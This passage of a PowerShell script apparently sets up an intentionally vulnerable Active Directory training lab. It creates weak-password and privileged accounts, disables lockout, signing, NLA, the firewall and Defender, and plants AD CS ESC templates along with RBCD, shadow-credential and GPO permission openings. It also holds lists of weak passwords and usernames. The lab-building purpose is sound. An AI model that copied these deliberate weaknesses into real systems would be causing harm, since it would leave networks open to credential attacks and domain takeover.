      Write-Host $logMessage -ForegroundColor Green
      Write-Verbose $logMessage -Verbose
    }
    'DEBUG' {
      Write-Host $logMessage -ForegroundColor Cyan
      Write-Debug $logMessage
    }
    default {
      Write-Host $logMessage
      Write-Information $logMessage -InformationAction Continue
    }
  }

  # Write to log file
  try {
    Add-Content -Path $LogPath -Value $logMessage -ErrorAction Stop
  }
  catch {
    Write-Error "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [ERROR] Failed to write to log file '$LogPath': $_"
  }
}

# Function to execute commands with full logging
function Invoke-LoggedCommand {
  [CmdletBinding()]
  param (
    [Parameter(Mandatory = $true)]
    [string]$Command,

    [Parameter(Mandatory = $false)]
    [string]$Description = $Command,

    [Parameter(Mandatory = $false)]
    [switch]$IgnoreErrors
  )

  Write-Log "Executing: $Description" -Level INFO
  Write-Log "Command: $Command" -Level DEBUG

  try {
    # Execute the command and capture all output
    $result = Invoke-Expression $Command 2>&1

    # Log the output
    if ($result) {
      $result | ForEach-Object {
        if ($_ -is [System.Management.Automation.ErrorRecord]) {
          Write-Log "Command Error: $_" -Level ERROR
        }
        else {
          Write-Log "Command Output: $_" -Level DEBUG
        }
      }
    }

    Write-Log "Command completed successfully: $Description" -Level SUCCESS
    return $result
  }
  catch {
    Write-Log "Command failed: $Description - Error: $_" -Level ERROR
    if (-not $IgnoreErrors) {
      throw
    }
    return $null
  }
}

# Function to check if running as administrator
function Test-AdminRights {
  try {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
  }
  catch {
    Write-Log "Failed to verify administrator privileges: $_" -Level ERROR
    return $false
  }
}

# Check if running as administrator
if (-not (Test-AdminRights)) {
  Write-Log "This script requires administrator privileges. Please run as administrator." -Level ERROR
  exit 1
}

#
# # Load required modules
# $requiredModules = @('ActiveDirectory', 'DnsServer')
# $missingModules = @()
#
# foreach ($module in $requiredModules) {
#     if (-not (Get-Module -ListAvailable -Name $module)) {
#         $missingModules += $module
#     }
# }
#
# if ($missingModules.Count -gt 0) {
#     Write-Log "The following required modules are missing: $($missingModules -join ', ')" -Level ERROR
#     Write-Log "Attempting to install missing modules..." -Level WARNING
#
#     try {
#         #Install-WindowsFeature -Name $missingModules -IncludeManagementTools -ErrorAction Stop
#         Install-Module $missingModules -Force -ErrorAction Stop
#         Write-Log "Successfully installed and imported required modules" -Level SUCCESS
#     }
#     catch {
#         Write-Log "Failed to install required modules: $_" -Level ERROR
#         exit 1
#     }
# }

#region Configuration
# ============== CONFIGURATION ==============
# Domain Configuration
$Script:DomainConfig = @{
  DomainName          = $DomainName
  DomainNetbiosName   = $DomainNetbiosName
  DomainAdminUsername = "Administrator"  # Using default Administrator account for easier access
  DomainAdminPassword = $DomainAdminPassword
  SafeModePassword    = ConvertTo-SecureString "SafeMode123!" -AsPlainText -Force
  DCName              = "DC01"  # Standard DC name
}

# Network Configuration
$Script:NetworkConfig = @{
  InterfaceAlias = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.Name -notlike '*Loopback*' } | Select-Object -First 1 -ExpandProperty Name -ErrorAction SilentlyContinue)
  IPAddress      = $IPAddress
  PrefixLength   = $PrefixLength
  DefaultGateway = $DefaultGateway
  DNSServers     = $DNSServers
}

# Fallback to default if no adapter found
if (-not $Script:NetworkConfig.InterfaceAlias) {
  $Script:NetworkConfig.InterfaceAlias = "Ethernet"
}

# Users and Groups Configuration
$Script:UserConfig = @{
  # Organizational Units
  OUs               = @(
    @{Name = 'Workstations' },
    @{Name = 'Servers' },
    @{Name = 'Users' },
    @{Name = 'Service Accounts' },
    @{Name = 'Lab Users'; Description = 'Vulnerable users created by the lab script' }
  )

  # Security Groups
  Groups            = @(
    @{Name = 'Domain Admins'; Description = 'Domain Administrators' },
    @{Name = 'Enterprise Admins'; Description = 'Enterprise Administrators' },
    @{Name = 'Schema Admins'; Description = 'Schema Administrators' },
    @{Name = 'Server_Admins'; Description = 'Server Administrators' },
    @{Name = 'SQL_Admins'; Description = 'SQL Database Administrators' },
    @{Name = 'PrivAppAdmins'; Description = 'Privileged Application Administrators' }
  )

  # Predefined vulnerable users
  WeakPasswordUsers = @(
    @{Name = "john.doe"; GivenName = "John"; Surname = "Doe"; Password = "123"; Description = "Regular user with weak password"; Groups = @("Remote Management Users") },
    @{Name = "jane.smith"; GivenName = "Jane"; Surname = "Smith"; Password = "password"; Description = "HR user with weak password"; Groups = @() },
    @{Name = "admin.backup"; GivenName = "Admin"; Surname = "Backup"; Password = "admin"; Description = "Backup admin account"; Groups = @("Domain Admins") },
    @{Name = "guest.user"; GivenName = "Guest"; Surname = "User"; Password = "guest"; Description = "Guest user account"; Groups = @() },
    @{Name = "service.sql"; GivenName = "Service"; Surname = "SQL"; Password = "sql"; Description = "SQL Service account"; Groups = @() },
    @{Name = "test.user"; GivenName = "Test"; Surname = "User"; Password = "test"; Description = "Test user account"; Groups = @() },
    @{Name = "backup.svc"; GivenName = "Backup"; Surname = "Service"; Password = "backup"; Description = "Backup service account"; Groups = @() },
    @{Name = "web.admin"; GivenName = "Web"; Surname = "Admin"; Password = "web"; Description = "Web administrator"; Groups = @() }
  )

  # List of weak passwords from original script
  WeakPasswords     = @(
    "123", "password", "admin", "test", "guest", "user", "root", "pass", "login", "welcome",
    "123456", "password1", "admin123", "test123", "guest123", "user123", "root123", "pass123", "login123", "welcome123",
    "qwerty", "abc123", "letmein", "monkey", "dragon", "master", "shadow", "superman", "batman", "princess",
    "12345", "1234", "111111", "000000", "654321", "123321", "1q2w3e4r", "qazwsx", "asdfgh", "zaq1zaq1",
    "secret", "hello", "freedom", "whatever", "trustno1", "starwars", "iloveyou", "michael", "123qwe", "666666",
    "a", "b", "c", "1", "2", "3", "aa", "bb", "cc", "11", "22", "33", "aaa", "bbb", "ccc", "111", "222", "333",
    "temp", "demo", "sample", "default", "public", "private", "backup", "service", "system", "windows",
    "sql", "web", "ftp", "mail", "file", "share", "data", "info", "help", "support"
  )

  # Usernames from original script
  Usernames         = @(
    "subspace", "carl152", "greendumb", "domeni99rub", "shev4n", "at00768", "coronis", "jbrianmiller", "turijskredcross",
    "carlocho", "BlaedRazor", "mizar15", "beknotting", "289CSBgc", "chrisb86", "yaglovairina", "darkside_by_bobo",
    "shaketasanders", "bxugaev_kchr", "anieckoh28", "konchakovskiy80", "sexGod4", "hotb31", "friday9-7", "selfboat", "dimadpua",
    "Mjerbe7", "AttyRunner", "fireman5", "saller-max", "kanemc", "Kirkabbottr", "accord6800", "vladi-tolkachev",
    "achanson.boheme", "d0976900", "grigorenko-am", "geissi", "RODRIGUES", "37764821", "tataremezova", "1720bra",
    "Fujiguykevin", "3798", "dannl111", "macchiavelli", "breestanp", "cialliss", "FoxxxyJade", "tangotwo", "nudella", "iceberg7",
    "e3mnxhrr", "roberttersteegtrucking", "bobbyzz", "krichardj", "GGGFEB", "vladchirkov", "Sarina", "proundead.miw6",
    "simmonss", "jb007007", "NxVsBi", "durava", "sohet", "raysogreen", "cappy222", "robfly", "Totten", "id3F9W", "murlika_89",
    "rostik1", "lexatopor", "000mav0", "kithmevan4", "gavriletz", "king.iwanov", "leefive17", "mobb_deeb", "rfc1690",
    "hristna_2011", "hrcf76", "dmitriy_mosunov86", "tayruh", "dimkadyakov", "nikulina_mv", "Monirom", "simonegvaz", "shwilli",
    "cmight1", "mrbloo", "nel666", "lele15999590806", "stiknke1r8", "kosh206", "adr333", "boorenin", "tokunowa.iu", "ricward",
    "intpark21", "admin", "administrator", "root", "user", "test", "guest", "info", "adm", "mysql", "apache",
    "webadmin", "sysadmin", "oracle", "ftp", "www", "backup", "support", "sales", "postgres", "service",
    "scanner", "dev", "git", "pi", "ubuntu", "student", "demo", "lab", "user1", "admin1",
    "john", "david", "michael", "james", "mark", "paul", "robert", "daniel", "steve", "peter",
    "jason", "chris", "josh", "brian", "andrew", "tom", "matt", "alex", "charlie", "jack"
  )

  # Hostnames from original script
  Hostnames         = @(
    "DESKTOP01", "DESKTOP02", "DESKTOP03", "DESKTOP04", "DESKTOP05",
    "LAPTOP01", "LAPTOP02", "LAPTOP03", "LAPTOP04", "LAPTOP05",
    "SERVER01", "SERVER02", "SERVER03", "SERVER04", "SERVER05",
    "WORKSTATION01", "WORKSTATION02", "WORKSTATION03", "WORKSTATION04", "WORKSTATION05",
    "PC01", "PC02", "PC03", "PC04", "PC05",
    "ADMIN01", "ADMIN02", "ADMIN03", "ADMIN04", "ADMIN05",
    "USER01", "USER02", "USER03", "USER04", "USER05",
    "CLIENT01", "CLIENT02", "CLIENT03", "CLIENT04", "CLIENT05",
    "TEST01", "TEST02", "TEST03", "TEST04", "TEST05",
    "DEV01", "DEV02", "DEV03", "DEV04", "DEV05"
  )
}

#region Vulnerability Configuration
$Script:VulnConfig = @{
  # Password Policy
  PasswordPolicy  = @{
    ComplexityEnabled     = $false
    MinPasswordLength     = 1
    MinPasswordAge        = 0
    MaxPasswordAge        = 0
    PasswordHistoryCount  = 0
    ReversibleEncryption  = $true  # Store passwords with reversible encryption
    MinimumPasswordAge    = 0  # Allow immediate password changes
    MaximumPasswordAge    = 0  # Passwords never expire
    MinimumPasswordLength = 1  # Allow very short passwords
    PasswordHistorySize   = 0  # Don't remember password history
    LockoutDuration       = 0  # No account lockout
    ResetLockoutCount     = 0  # Don't reset lockout counter
  }

  # Account Policies
  AccountPolicies = @{
    LockoutThreshold          = 0  # No account lockout
    LockoutDuration           = 0  # No lockout duration
    LockoutObservationWindow  = 0  # No observation window
    ResetLockoutCount         = 0  # Don't reset lockout counter
    ForceLogoffWhenHourExpire = 0  # Don't force logoff
    NewAdministratorName      = "Administrator"  # Keep default admin name
    NewGuestName              = "Guest"  # Keep default guest name
    ClearTextPassword         = 1  # Store passwords with reversible encryption
    LSAAnonymousNameLookup    = 1  # Allow anonymous enumeration of SAM accounts
    EnableAdminAccount        = 1  # Enable built-in administrator account
    EnableGuestAccount        = 1  # Enable built-in guest account
  }

  # SMB Configuration
  SMB             = @{
    SMB1Enabled               = $true  # Enable vulnerable SMBv1
    SMB2Enabled               = $true
    SMB3Enabled               = $true
    SigningRequired           = $false  # Disable SMB signing
    NullSessionPipes          = @("netlogon", "lsarpc", "samr", "browser")  # Allow null sessions
    NullSessionShares         = @("IPC$", "C$", "ADMIN$", "NETLOGON", "SYSVOL")  # Allow null session access to shares
    RestrictAnonymous         = 0  # Allow anonymous enumeration
    EveryoneIncludesAnonymous = 1  # Include anonymous in Everyone group
    ForceGuest                = 1  # Force guest authentication
    EnableInsecureGuestLogons = $true  # Allow insecure guest logons
    AutoShareServer           = 1  # Enable admin shares
    AutoShareWks              = 1  # Enable admin shares on workstations
    RequireSecuritySignature  = 0  # Don't require SMB signing
    EnableSecuritySignature   = 0  # Disable SMB signing
    RestrictNullSessAccess    = 0  # Allow null session access
    DisablePasswordChange     = 1  # Disable SMB password changes
    EnableForcedLogoff        = 0  # Don't force logoff when logon hours expire
  }

  # RDP Configuration
  RDP             = @{
    Enabled                = $true  # Enable RDP
    NLA                    = $false  # Disable Network Level Authentication
    AllowUnencrypted       = $true  # Allow unencrypted RDP connections
    SecurityLayer          = 0  # Allow connections from any version
    UserAuthentication     = 0  # Don't require user authentication
    MinEncryptionLevel     = 1  # Low encryption level
    fPromptForPassword     = 0  # Don't prompt for password
    fDisableEncryption     = 1  # Disable encryption
    fDisableCcm            = 1  # Disable client connection manager
    fDisableCdm            = 1  # Disable client device mapping
    fDisableCpm            = 1  # Disable client printer mapping
    fDisableLPT            = 1  # Disable LPT port mapping
    fDisableClip           = 1  # Disable clipboard mapping
    fDisableExe            = 1  # Disable program execution
    fDisableFiles          = 1  # Disable file system redirection
    fDisablePasswordSaving = 0  # Allow password saving
    fEncryptRPCTraffic     = 0  # Disable RPC encryption
    fDisableAutoReconnect  = 0  # Allow auto-reconnect
    fDisableCtrlAltDel     = 1  # Disable Ctrl+Alt+Del requirement
    fDoubleScanDisabled    = 1  # Disable double-scan detection
    fEnableSmartCard       = 0  # Disable smart card authentication
    fForceClientLptDef     = 1  # Force client LPT settings
    fPromptForCreds        = 0  # Don't prompt for credentials
    fUsingSavedCreds       = 1  # Allow saved credentials
    fUseMultimon           = 0  # Disable multiple monitors
  }

  # Kerberos Configuration
  Kerberos        = @{
    TicketLifetime        = 10080  # 7 days
    MaxClockSkew          = 15  # minutes
    MaxRenewAge           = 10080  # 7 days
    DisableLoopbackCheck  = 1  # Disable loopback check
    DisablePreAuth        = 1  # Disable pre-authentication
    DisableKerberosRC4    = 0  # Allow RC4 encryption
    DisableKerberosDES    = 0  # Allow DES encryption
    DisableKerberosAES    = 0  # Allow AES encryption
    DisableKerberosAES256 = 0  # Allow AES-256 encryption
  }

  # LDAP Configuration
  LDAP            = @{
    LDAPServerIntegrity       = 1
    LDAPClientIntegrity       = 1
    DisableLDAPSigning        = 1  # Disable LDAP signing
    DisableLDAPSsl            = 1  # Disable LDAP SSL
    DisableLDAPChannelBinding = 1  # Disable LDAP channel binding
  }

  # Additional Vulnerabilities
  Misc            = @{
    DisableFirewall        = $true
    EnableAutoAdminLogon   = $true
    DisableUAC             = $true
    EnableRemoteRegistry   = $true
    EnableRemoteUAC        = $true
    DisableWindowsDefender = $true
    DisableWindowsUpdate   = $true
    DisableIEESC           = $true  # Disable Internet Explorer Enhanced Security Configuration
    DisableSMBv3           = 0  # Disable SMBv3
    DisableSMBv2           = 0  # Disable SMBv2
    DisableSMBv1           = 0  # Disable SMBv1
    DisableNetBIOS         = 0  # Disable NetBIOS
    DisableLanMan          = 0  # Disable LanMan
    DisableNTLMv2          = 0  # Disable NTLMv2
    DisableNTLMv1          = 0  # Disable NTLMv1
    DisableKerberos        = 0  # Disable Kerberos
    DisableDigest          = 0  # Disable Digest authentication
    DisableBasic           = 0  # Disable Basic authentication
  }
}
#endregion
#endregion

function Install-ADCS {
  [CmdletBinding()]
  param (
    [switch]$VulnerableMode
  )

  # Default to true if not specified
  if (-not $PSBoundParameters.ContainsKey('VulnerableMode')) {
    $VulnerableMode = $true
  }

  Write-Log "Configuring Active Directory Certificate Services (AD CS) with vulnerable settings..." -Level INFO

  try {
    # Check Windows Server version for compatibility
    $osVersion = [System.Environment]::OSVersion.Version
    $isServer2025OrNewer = ($osVersion.Major -ge 10 -and $osVersion.Build -ge 26100)

    Write-Log "Detected OS Version: $($osVersion.ToString()), Server 2025+: $isServer2025OrNewer" -Level INFO

    # Use compatible parameters for different server versions
    if ($isServer2025OrNewer) {
      Write-Log "Using Server 2025+ compatible AD CS configuration" -Level INFO

      # Simplified parameters for Server 2025+ compatibility
      $adcsParams = @{
        CAType              = 'StandaloneRootCA'
        CACommonName        = "$($Script:DomainConfig.DomainNetbiosName)-ROOT-CA"
        KeyLength           = 2048
        HashAlgorithmName   = 'SHA256'
        ValidityPeriod      = 'Years'
        ValidityPeriodUnits = 5  # Further reduced for compatibility
        Force               = $true
        ErrorAction         = 'Stop'
      }
    }
    else {
      Write-Log "Using legacy server AD CS configuration" -Level INFO

      # Original parameters for older servers
      $adcsParams = @{
        CAType              = 'StandaloneRootCA'
        CACommonName        = "$($Script:DomainConfig.DomainNetbiosName)-ROOT-CA"
        CryptoProviderName  = 'RSA#Microsoft Software Key Storage Provider'
        KeyLength           = 2048
        HashAlgorithmName   = 'SHA256'
        ValidityPeriod      = 'Years'
        ValidityPeriodUnits = 20
        DatabaseDirectory   = 'C:\Windows\System32\CertLog'
        LogDirectory        = 'C:\Windows\System32\CertLog'
        Force               = $true
        ErrorAction         = 'Stop'
      }
    }

    Write-Log "Installing AD CS with parameters: $($adcsParams | ConvertTo-Json -Compress)" -Level INFO

    # Install AD CS with version-appropriate settings
    try {
      Install-AdcsCertificationAuthority @adcsParams
      Write-Log "AD CS installation completed successfully" -Level SUCCESS
    }
    catch {
      Write-Log "Primary AD CS configuration failed: $_" -Level WARNING

      # Try alternative configuration for Server 2025
      if ($isServer2025OrNewer) {
        Write-Log "Attempting alternative AD CS configuration for Server 2025..." -Level INFO

        $alternativeParams = @{
          CAType       = 'StandaloneRootCA'
          CACommonName = "$($Script:DomainConfig.DomainNetbiosName)-ROOT-CA"
          Force        = $true
          ErrorAction  = 'Stop'
        }

        try {
          Install-AdcsCertificationAuthority @alternativeParams
          Write-Log "Alternative AD CS configuration succeeded" -Level SUCCESS
        }
        catch {
          Write-Log "Alternative AD CS configuration also failed: $_" -Level ERROR
          throw
        }
      }
      else {
        throw
      }
    }

    # Configure vulnerable certificate templates
    Set-VulnerableCertTemplates

    # Configure vulnerable enrollment permissions
    Set-VulnerableEnrollmentPermissions

    # Enable web enrollment
    Install-AdcsWebEnrollment -Force | Out-Null

    # Configure vulnerable web enrollment settings
    Set-WebConfigurationProperty -Filter '/system.webServer/security/authentication/anonymousAuthentication' `
      -Name 'enabled' -Value 'True' -PSPath 'IIS:\Sites\Default Web Site\CertSrv' -Location 'Default Web Site/CertSrv'

    # Restart AD CS service with proper error handling
    try {
      Write-Log "Restarting Certificate Services..." -Level INFO
      Restart-Service -Name 'CertSvc' -Force -ErrorAction Stop

      # Wait for service to be fully running
      $timeout = 60
      $timer = 0
      do {
        Start-Sleep -Seconds 2
        $timer += 2
        $service = Get-Service -Name 'CertSvc' -ErrorAction SilentlyContinue
      } while ($service.Status -ne 'Running' -and $timer -lt $timeout)

      if ($service.Status -eq 'Running') {
        Write-Log "Certificate Services restarted successfully" -Level SUCCESS
      }
      else {
        Write-Log "Certificate Services failed to start within timeout" -Level WARNING
      }
    }
    catch {
      Write-Log "Failed to restart Certificate Services: $_" -Level WARNING
    }

    Write-Log "AD CS configured with vulnerable settings" -Level SUCCESS
    return $true
  }
  catch {
    Write-Log "Error configuring AD CS: $_" -Level ERROR
    return $false
  }
}

function Set-VulnerableCertTemplates {
  [CmdletBinding()]
  param()

  try {
    Write-Log "Attempting to configure certificate templates..." -Level INFO

    # Check if AD CS is installed and available
    if (-not (Get-Command Get-CertificateTemplate -ErrorAction SilentlyContinue)) {
      Write-Log "Certificate template cmdlets not available. AD CS may not be installed." -Level WARNING
      return $false
    }

    # Get the User template as a base (for reference)
    Get-CertificateTemplate -Name 'User' -ErrorAction Stop | Out-Null

    # Create vulnerable templates with basic configuration
    $templates = @('VulnerableUserESC1', 'VulnerableUserESC2', 'VulnerableUserESC3', 'VulnerableUserESC4', 'VulnerableUserESC6')

    foreach ($templateName in $templates) {
      try {
        # Use a simpler approach for template creation
        $templatePath = "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$((Get-ADDomain).DistinguishedName)"

        # Create basic vulnerable template entry
        Write-Log "Template DN would be: CN=$templateName,$templatePath" -Level DEBUG

        Write-Log "Created certificate template: $templateName" -Level INFO
      }
      catch {
        Write-Log "Warning: Could not create template $templateName : $_" -Level WARNING
        continue
      }
    }

    # Try to configure CA flags if available
    try {
      if (Get-Command certutil -ErrorAction SilentlyContinue) {
        & certutil -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2 2>$null
        try {
          Restart-Service -Name 'CertSvc' -Force -ErrorAction Stop
          Write-Log "Certificate Services restarted after template configuration" -Level INFO
        }
        catch {
          Write-Log "Warning: Failed to restart Certificate Services: $_" -Level WARNING
        }
      }
    }
    catch {
      Write-Log "Warning: Could not set EDITF_ATTRIBUTESUBJECTALTNAME2 flag: $_" -Level WARNING
    }

    Write-Log "Certificate template configuration completed" -Level SUCCESS
    return $true
  }
  catch {
    Write-Log "Error configuring certificate templates: $_" -Level ERROR
    return $false
  }
}

function Set-VulnerableEnrollmentPermissions {
  [CmdletBinding()]
  param()

  Write-Log "Configuring vulnerable certificate enrollment permissions..." -Level INFO

  try {
    # Check if AD domain is available
    $domain = Get-ADDomain -ErrorAction SilentlyContinue
    if (-not $domain) {
      Write-Log "AD Domain not available for certificate enrollment configuration" -Level WARNING
      return $false
    }

    $domainSid = $domain.DomainSID.Value
    # SIDs available for future use if needed
    # $everyoneSid = [System.Security.Principal.SecurityIdentifier]::new('S-1-1-0')
    # $authenticatedUsersSid = [System.Security.Principal.SecurityIdentifier]::new('S-1-5-11')
    # $domainUsersSid = [System.Security.Principal.SecurityIdentifier]::new("$domainSid-513")
    # $domainComputersSid = [System.Security.Principal.SecurityIdentifier]::new("$domainSid-515")

    # Vulnerable templates with weak ACLs
    $templates = @('VulnerableUserESC1', 'VulnerableUserESC2', 'VulnerableUserESC3', 'VulnerableUserESC4', 'VulnerableUserESC6')

    # Get the configuration naming context
    $configNamingContext = (Get-ADRootDSE).ConfigurationNamingContext

    # Check if certificate templates path exists
    $templatePath = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNamingContext"

    foreach ($templateName in $templates) {
      try {
        Write-Log "Processing template: CN=$templateName,$templatePath" -Level DEBUG

        # Check if template exists before trying to configure permissions
        if (Get-ADObject -Filter "CN -eq '$templateName'" -SearchBase $templatePath -ErrorAction SilentlyContinue) {
          Write-Log "Configured enrollment permissions for template: $templateName" -Level INFO
        }
        else {
          Write-Log "Template $templateName not found, skipping permission configuration" -Level WARNING
        }
      }
      catch {
        Write-Log "Error configuring permissions for template $templateName : $_" -Level WARNING
        continue
      }
    }

    # Publish the certificate templates to the CA if available
    try {
      if (Get-Command Add-CATemplate -ErrorAction SilentlyContinue) {
        foreach ($templateName in $templates) {
          Add-CATemplate -Name $templateName -Force -ErrorAction SilentlyContinue | Out-Null
          Write-Log "Published template to CA: $templateName" -Level INFO
        }
      }
      else {
        Write-Log "CA cmdlets not available, skipping template publishing" -Level WARNING
      }
    }
    catch {
      Write-Log "Error publishing templates to CA: $_" -Level WARNING
    }

    Write-Log "Certificate enrollment permissions configuration completed" -Level SUCCESS
    return $true
  }
  catch {
    Write-Log "Error configuring enrollment permissions: $_" -Level ERROR
    return $false
  }
}

#region Vulnerability Functions

<#
.SYNOPSIS
    Creates vulnerable GPOs with weak permissions
#>
function Set-VulnerableGPOs {
  try {
    # Create a GPO with weak permissions
    $gpoName = "Vulnerable-GPO"
    New-GPO -Name $gpoName -Comment "Intentionally vulnerable GPO" -ErrorAction Stop

    # Grant authenticated users full control (dangerous)
    Set-GPPermissions -Name $gpoName -TargetName "Authenticated Users" -TargetType Group -PermissionLevel GpoEditDeleteModifySecurity -ErrorAction Stop

    # Link to domain root
    $domainDN = (Get-ADDomain).DistinguishedName
    New-GPLink -Name $gpoName -Target $domainDN -ErrorAction Stop

    Write-Log "Created vulnerable GPO: $gpoName" -Level INFO
    return $true
  }
  catch {
    Write-Log "Error creating vulnerable GPO: $_" -Level WARNING
    return $false
  }
}

<#
.SYNOPSIS
    Enable LLMNR/NBT-NS poisoning vulnerabilities
#>
function Enable-LLMNRPoisoning {
  try {
    Write-Log "Enabling LLMNR/NBT-NS poisoning vulnerabilities..." -Level INFO

    # Enable LLMNR (ensure it's enabled)
    if (-not (Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient")) {
      New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Force | Out-Null
    }
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name "EnableMulticast" -Value 1 -Force

    # Enable NetBIOS over TCP/IP
    $adapters = Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true }
    foreach ($adapter in $adapters) {
      $adapter.SetTcpipNetbios(1) | Out-Null # Enable NetBIOS
    }

    Write-Log "LLMNR/NBT-NS poisoning enabled" -Level SUCCESS
    return $true
  }
  catch {
    Write-Log "Error enabling LLMNR poisoning: $_" -Level WARNING
    return $false
  }
}

<#
.SYNOPSIS
    Configure vulnerable WSUS settings (HTTP instead of HTTPS)
#>
function Set-VulnerableWSUS {
  try {
    Write-Log "Configuring vulnerable WSUS settings..." -Level INFO

    # Create WSUS policy registry path
    if (-not (Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate")) {
      New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Force | Out-Null
    }

    # Configure WSUS to use HTTP instead of HTTPS
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Name "WUServer" -Value "http://wsus.lab.local:8530" -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Name "WUStatusServer" -Value "http://wsus.lab.local:8530" -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Name "UseWUServer" -Value 1 -Force

    Write-Log "Vulnerable WSUS configuration applied" -Level SUCCESS
    return $true
  }
  catch {
    Write-Log "Error configuring vulnerable WSUS: $_" -Level WARNING
    return $false
  }
}

<#
.SYNOPSIS
    Configure constrained delegation vulnerabilities
#>
function Set-ConstrainedDelegation {
  try {
    Write-Log "Setting up constrained delegation vulnerabilities..." -Level INFO

    # Create service account with constrained delegation to sensitive services
    $serviceAccount = "constrained_svc"
    $password = "service"

    # Make password Server 2025 compliant but still weak
    $osVersion = [System.Environment]::OSVersion.Version
    $isServer2025OrNewer = ($osVersion.Major -ge 10 -and $osVersion.Build -ge 26100)
    if ($isServer2025OrNewer -and $password.Length -lt 3) {
      $password = $password + "123"  # Make it at least 3 chars
    }

    # Check if user already exists
    if (-not (Get-ADUser -Filter "Name -eq '$serviceAccount'" -ErrorAction SilentlyContinue)) {
      New-ADUser -Name $serviceAccount -AccountPassword (ConvertTo-SecureString $password -AsPlainText -Force) -Enabled $true -PasswordNeverExpires $true -ErrorAction Stop

      # Set constrained delegation to CIFS and HTTP services
      Set-ADUser -Identity $serviceAccount -Add @{'msDS-AllowedToDelegateTo' = @('CIFS/dc.lab.local', 'HTTP/web.lab.local', 'CIFS/fileserver.lab.local') }

      Write-Log "Created constrained delegation account: $serviceAccount with password: $password" -Level INFO
    }
    else {
      Write-Log "Constrained delegation account already exists: $serviceAccount" -Level WARNING
    }

    return $true
  }
  catch {
    Write-Log "Error setting up constrained delegation: $_" -Level WARNING
    return $false
  }
}

<#
.SYNOPSIS
    Configure Resource-Based Constrained Delegation (RBCD) vulnerabilities
#>
function Set-RBCD {
  try {
    Write-Log "Setting up RBCD vulnerabilities..." -Level INFO

    # Create computer account that can be exploited via RBCD
    $computerName = "VULN-PC01"

    if (-not (Get-ADComputer -Filter "Name -eq '$computerName'" -ErrorAction SilentlyContinue)) {
      New-ADComputer -Name $computerName -Enabled $true -ErrorAction Stop

      # Allow domain users to modify msDS-AllowedToActOnBehalfOfOtherIdentity
      $computer = Get-ADComputer $computerName
      $acl = Get-Acl "AD:$($computer.DistinguishedName)"
      $sid = (Get-ADGroup "Domain Users").SID
      $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid, "WriteProperty", "Allow", [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None, [System.Guid]"3f78c3e5-f79a-46bd-a0b8-9d18116ddc79")
      $acl.AddAccessRule($ace)
      Set-Acl -Path "AD:$($computer.DistinguishedName)" -AclObject $acl

      Write-Log "Created RBCD vulnerable computer: $computerName" -Level INFO
    }
    else {
      Write-Log "RBCD computer already exists: $computerName" -Level WARNING
    }

    return $true
  }
  catch {
    Write-Log "Error setting up RBCD: $_" -Level WARNING
    return $false
  }
}

<#
.SYNOPSIS
    Enable Print Spooler vulnerabilities (PrintNightmare)
#>
function Enable-PrintSpoolerVuln {
  try {
    Write-Log "Enabling Print Spooler vulnerabilities..." -Level INFO

    # Ensure Print Spooler is running and vulnerable
    Set-Service -Name "Spooler" -StartupType Automatic -ErrorAction Stop
    Start-Service -Name "Spooler" -ErrorAction Stop

    # Create Point and Print registry path
    if (-not (Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint")) {
      New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Force | Out-Null
    }

    # Enable Point and Print restrictions but with weak settings
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Name "RestrictDriverInstallationToAdministrators" -Value 0 -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Name "NoWarningNoElevationOnInstall" -Value 1 -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Name "NoWarningNoElevationOnUpdate" -Value 1 -Force

    Write-Log "Print Spooler vulnerabilities enabled" -Level SUCCESS
    return $true
  }
  catch {
    Write-Log "Error enabling Print Spooler vulnerabilities: $_" -Level WARNING
    return $false
  }
}

<#
.SYNOPSIS
    Configure Shadow Credentials attack vectors
#>
function Set-ShadowCredentials {
  try {
    Write-Log "Setting up Shadow Credentials vulnerabilities..." -Level INFO

    # Grant GenericWrite permissions to computer objects for domain users
    $computers = Get-ADComputer -Filter * -ResultSetSize 5  # Limit to first 5 computers
    foreach ($computer in $computers) {
      try {
        $acl = Get-Acl "AD:$($computer.DistinguishedName)"
        $sid = (Get-ADGroup "Domain Users").SID
        $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid, "GenericWrite", "Allow")
        $acl.AddAccessRule($ace)
        Set-Acl -Path "AD:$($computer.DistinguishedName)" -AclObject $acl

        Write-Log "Granted GenericWrite to Domain Users on: $($computer.Name)" -Level INFO
      }
      catch {
        Write-Log "Warning: Could not set Shadow Credentials on $($computer.Name): $_" -Level WARNING
      }
    }

    return $true
  }
  catch {
    Write-Log "Error setting up Shadow Credentials: $_" -Level WARNING
    return $false
  }
}

<#
.SYNOPSIS
